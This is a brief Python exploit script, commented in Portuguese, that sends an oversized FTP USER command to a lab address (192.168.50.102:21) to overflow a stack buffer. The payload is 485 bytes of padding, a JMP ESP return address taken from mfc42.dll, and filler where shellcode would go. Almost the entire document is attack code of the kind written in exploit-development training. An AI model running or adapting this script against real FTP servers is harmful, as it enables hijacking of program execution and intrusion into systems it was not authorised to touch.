#!/usr/bin/python
import socket

# Endereco para JMP ESP em user32.dll - 7E379353
# Endereço para JMP ESP em mfc42.dll - 7C86467B
buf = (b'A' * 485 + b'\x7b\x46\x86\x7c' + b'C' * (1100-489))

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.50.102", 21))
s.send(b"USER " + buf + b" \r\n")
